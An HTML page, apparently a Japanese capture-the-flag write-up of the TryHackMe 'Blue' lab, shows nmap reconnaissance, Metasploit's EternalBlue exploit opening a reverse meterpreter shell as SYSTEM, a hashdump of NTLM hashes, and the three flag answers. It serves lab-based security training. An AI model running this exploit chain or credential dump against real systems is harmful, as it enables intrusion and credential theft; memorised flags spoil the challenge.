@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Blue (班教育) Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Blue (班教育)</h1>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Windows</span>
+      <span class="badge">Series: 班教育</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+
+    <article class="writeup-body">
+      <p>nmapを実施する</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/blue]
+      └─$ nmap 10.48.149.42 
+      Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 15:13 +0900
+      Nmap scan report for 10.48.149.42
+      Host is up (0.13s latency).
+      Not shown: 991 closed tcp ports (reset)
+      PORT      STATE SERVICE
+      135/tcp   open  msrpc
+      139/tcp   open  netbios-ssn
+      445/tcp   open  microsoft-ds
+      3389/tcp  open  ms-wbt-server
+      49152/tcp open  unknown
+      49153/tcp open  unknown
+      49154/tcp open  unknown
+      49160/tcp open  unknown
+      49165/tcp open  unknown
+
+      Nmap done: 1 IP address (1 host up) scanned in 4.35 seconds
+                                                                                                              
+      ┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/blue]
+      └─$ </code></pre>
+      <p>windowsらしきポートが開いている<br>
+      各ポートに対して<code>-sCV</code>を実施</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/blue]
+      └─$ nmap 10.48.149.42 -p 135,139,445 -sCV -T4
+      Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 15:14 +0900
+      Nmap scan report for 10.48.149.42
+      Host is up (0.13s latency).
+
+      PORT    STATE SERVICE      VERSION
+      135/tcp open  msrpc        Microsoft Windows RPC
+      139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+      445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+      Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+      Host script results:
+      | smb2-security-mode: 
+      |   2.1: 
+      |_    Message signing enabled but not required
+      |_nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:51:a6:2c:b0:d5 (unknown)
+      | smb-security-mode: 
+      |   account_used: guest
+      |   authentication_level: user
+      |   challenge_response: supported
+      |_  message_signing: disabled (dangerous, but default)
+      | smb-os-discovery: 
+      |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+      |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+      |   Computer name: Jon-PC
+      |   NetBIOS computer name: JON-PC\x00
+      |   Workgroup: WORKGROUP\x00
+      |_  System time: 2026-06-09T01:14:24-05:00
+      | smb2-time: 
+      |   date: 2026-06-09T06:14:24
+      |_  start_date: 2026-06-09T06:11:25
+      |_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
+
+      Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+      Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds
+                                                                                                              
+      ┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/blue]
+      └─$ </code></pre>
+      <p>Windows 7 Proであることがわかった<br>
+      <code>--script=vuln</code>も実施する</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/blue]
+      └─$ nmap 10.48.149.42 -p 135,139,445 --script=vuln -T4
+      Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 15:16 +0900
+      Nmap scan report for 10.48.149.42
+      Host is up (0.13s latency).
+
+      PORT    STATE SERVICE
+      135/tcp open  msrpc
+      139/tcp open  netbios-ssn
+      445/tcp open  microsoft-ds
+
+      Host script results:
+      |_smb-vuln-ms10-054: false
+      |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+      | smb-vuln-ms17-010: 
+      |   VULNERABLE:
+      |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+      |     State: VULNERABLE
+      |     IDs:  CVE:CVE-2017-0143
+      |     Risk factor: HIGH
+      |       A critical remote code execution vulnerability exists in Microsoft SMBv1
+      |        servers (ms17-010).
+      |           
+      |     Disclosure date: 2017-03-14
+      |     References:
+      |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+      |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+      |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+      |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+
+      Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
+      </code></pre>
+      <p><code>CVE-2017-0143</code>の脆弱性を発見した<br>
+      SMBv1の中にクリティカルなRCEの脆弱性があるらしい</p>
+      <p>これを<code>msfconsole</code>で探してみる</p>
+      <pre><code class="language-bash">msf &gt; search CVE-2017-0143
+
+      Matching Modules
+      ================
+
+         #   Name                                           Disclosure Date  Rank     Check  Description
+         -   ----                                           ---------------  ----     -----  -----------
+         0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+         1     \_ target: Automatic Target                  .                .        .      .
+         2     \_ target: Windows 7                         .                .        .      .
+         3     \_ target: Windows Embedded Standard 7       .                .        .      .
+         4     \_ target: Windows Server 2008 R2            .                .        .      .
+         5     \_ target: Windows 8                         .                .        .      .
+         6     \_ target: Windows 8.1                       .                .        .      .
+         7     \_ target: Windows Server 2012               .                .        .      .
+         8     \_ target: Windows 10 Pro                    .                .        .      .
+         9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+         10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+         11    \_ target: Automatic                         .                .        .      .
+         12    \_ target: PowerShell                        .                .        .      .
+         13    \_ target: Native upload                     .                .        .      .
+         14    \_ target: MOF upload                        .                .        .      .
+         15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+         16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+         17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+         18    \_ AKA: ETERNALBLUE                          .                .        .      .
+         19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+         20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+         21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+         22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+         23    \_ AKA: ETERNALBLUE                          .                .        .      .
+         24  auxiliary/scanner/smb/smb_ms17_010             .                normal   Yes    MS17-010 SMB RCE Detection
+         25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+         26    \_ AKA: ETERNALBLUE                          .                .        .      .
+         27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+         28    \_ target: Execute payload (x64)             .                .        .      .
+         29    \_ target: Neutralize implant                .                .        .      .
+
+
+      Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce                                                                                      
+      After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
+
+      msf &gt; </code></pre>
+      <p>3つのモジュールがヒットした<br>
+      1つ目の<code>exploit/windows/smb/ms17_010_eternalblue</code>はwin環境にエクスプロイトするモジュール<br>
+      <code>--script=vuln</code>の結果と一致する</p>
+      <p>２つ目の<code>exploit/windows/smb/ms17_010_psexec</code>はPsExecを使う<br>
+      違いそう</p>
+      <p>３つ目と４つ目の<code>auxiliary</code>はスキャンモジュールなので今回使わなそう</p>
+      <p>1つ目のモジュールを使ってみる<br>
+      １～９行目でターゲット選択ができそう<br>
+      先ほどの結果でOSが分かっているので<br>
+      <code>2     \_ target: Windows 7</code><br>
+      を選ぶ</p>
+      <pre><code class="language-bash">msf exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.48.149.42
+      rhosts =&gt; 10.48.149.42
+      msf exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost tun0
+      lhost =&gt; 192.168.205.211
+      msf exploit(windows/smb/ms17_010_eternalblue) &gt; run
+      [*] Started reverse TCP handler on 192.168.205.211:4444 
+      [*] 10.48.149.42:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+      [+] 10.48.149.42:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+      /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.29/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+      [*] 10.48.149.42:445      - Scanned 1 of 1 hosts (100% complete)
+      [+] 10.48.149.42:445 - The target is vulnerable.
+      [*] 10.48.149.42:445 - Connecting to target for exploitation.
+      [+] 10.48.149.42:445 - Connection established for exploitation.
+      [+] 10.48.149.42:445 - Target OS selected valid for OS indicated by SMB reply
+      [*] 10.48.149.42:445 - CORE raw buffer dump (42 bytes)
+      [*] 10.48.149.42:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+      [*] 10.48.149.42:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+      [*] 10.48.149.42:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+      [+] 10.48.149.42:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+      [*] 10.48.149.42:445 - Trying exploit with 12 Groom Allocations.
+      [*] 10.48.149.42:445 - Sending all but last fragment of exploit packet
+      [*] 10.48.149.42:445 - Starting non-paged pool grooming
+      [+] 10.48.149.42:445 - Sending SMBv2 buffers
+      [+] 10.48.149.42:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+      [*] 10.48.149.42:445 - Sending final SMBv2 buffers.
+      [*] 10.48.149.42:445 - Sending last fragment of exploit packet!
+      [*] 10.48.149.42:445 - Receiving response from exploit packet
+      [+] 10.48.149.42:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+      [*] 10.48.149.42:445 - Sending egg to corrupted connection.
+      [*] 10.48.149.42:445 - Triggering free of corrupted buffer.
+      [-] 10.48.149.42:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+      [-] 10.48.149.42:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+      [-] 10.48.149.42:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+      [*] 10.48.149.42:445 - Connecting to target for exploitation.
+      [+] 10.48.149.42:445 - Connection established for exploitation.
+      [+] 10.48.149.42:445 - Target OS selected valid for OS indicated by SMB reply
+      [*] 10.48.149.42:445 - CORE raw buffer dump (42 bytes)
+      [*] 10.48.149.42:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+      [*] 10.48.149.42:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+      [*] 10.48.149.42:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+      [+] 10.48.149.42:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+      [*] 10.48.149.42:445 - Trying exploit with 17 Groom Allocations.
+      [*] 10.48.149.42:445 - Sending all but last fragment of exploit packet
+      [*] 10.48.149.42:445 - Starting non-paged pool grooming
+      [+] 10.48.149.42:445 - Sending SMBv2 buffers
+      [+] 10.48.149.42:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+      [*] 10.48.149.42:445 - Sending final SMBv2 buffers.
+      [*] 10.48.149.42:445 - Sending last fragment of exploit packet!
+      [*] 10.48.149.42:445 - Receiving response from exploit packet
+      [+] 10.48.149.42:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+      [*] 10.48.149.42:445 - Sending egg to corrupted connection.
+      [*] 10.48.149.42:445 - Triggering free of corrupted buffer.
+      [*] Sending stage (248902 bytes) to 10.48.149.42
+      [+] 10.48.149.42:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+      [+] 10.48.149.42:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+      [+] 10.48.149.42:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+      [*] Meterpreter session 1 opened (192.168.205.211:4444 -&gt; 10.48.149.42:49217) at 2026-06-09 15:25:43 +0900
+
+      meterpreter &gt; </code></pre>
+      <p>途中<code>FAIL</code>が出たが無事meterpreterを取得できた</p>
+      <pre><code class="language-bash">meterpreter &gt; sysinfo
+      Computer        : JON-PC
+      OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+      Architecture    : x64
+      System Language : en_US
+      Domain          : WORKGROUP
+      Logged On Users : 0
+      Meterpreter     : x64/windows
+      meterpreter &gt; getuid
+      Server username: NT AUTHORITY\SYSTEM
+      meterpreter &gt; </code></pre>
+      <p>システム情報とユーザー情報を取得した<br>
+      SYSTEM権限でログインできている<br>
+      <code>hashdump</code>で権限情報をとる</p>
+      <pre><code class="language-bash">meterpreter &gt; hashdump
+      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+      Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+      meterpreter &gt; </code></pre>
+      <p>flagの名前が問題文から明らかになっているので<br>
+      探してみる</p>
+      <pre><code class="language-bash">meterpreter &gt; search -h
+      Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]...
+      Search for files.
+
+      OPTIONS:
+
+          -a   Find files modified after timestamp (UTC).  Format: YYYY-mm-dd or YYYY-mm-ddTHH:MM:SS
+          -b   Find files modified before timestamp (UTC). Format: YYYY-mm-dd or YYYY-mm-ddTHH:MM:SS
+          -d   The directory/drive to begin searching from. Leave empty to search all drives. (Default: )
+          -f   A file pattern glob to search for. (e.g. *secret*.doc?)
+          -h   Help Banner
+          -r   Recursively search sub directories. (Default: true)
+
+      meterpreter &gt; </code></pre>
+      <p><code>search</code>コマンドという便利なコマンドがあるのでヘルプを見る<br>
+      <code>-f</code>が使えそうなので使ってみる</p>
+      <pre><code class="language-bash">meterpreter &gt; search -f flag*
+      Found 6 results...
+      ==================
+
+      Path                                                             Size (bytes)  Modified (UTC)
+      ----                                                             ------------  --------------
+      c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk  482           2019-03-18 04:26:42 +0900
+      c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk  848           2019-03-18 04:30:04 +0900
+      c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk  2344          2019-03-18 04:32:52 +0900
+      c:\Users\Jon\Documents\flag3.txt                                 37            2019-03-18 04:26:36 +0900
+      c:\Windows\System32\config\flag2.txt                             34            2019-03-18 04:32:48 +0900
+      c:\flag1.txt                                                     24            2019-03-18 04:27:21 +0900
+
+      meterpreter &gt; </code></pre>
+      <p>３つのフラグが見つかった<br>
+      それぞれcatしてみる</p>
+      <pre><code class="language-bash">meterpreter &gt; cat c:\\flag1.txt
+      flag{access_the_machine} 
+      meterpreter &gt; cat c:\\Windows\\System32\\config\\flag2.txt
+      flag{sam_database_elevated_access} 
+      meterpreter &gt; cat c:\\Users\\Jon\\Documents\\flag3.txt
+      flag{admin_documents_can_be_valuable}
+      meterpreter &gt; 
+      </code></pre>
+      <p>バックスラッシュはエスケープしてやる必要がある（とても大事）</p>
+      <p>おわり</p>
+    </article>
+  </main>
+
+  <footer>
+    <p>班教育 WriteUp &mdash; <a href="https://github.com/53b29461/thm-writeups">GitHub</a></p>
+  </footer>
+</body>
+</html>
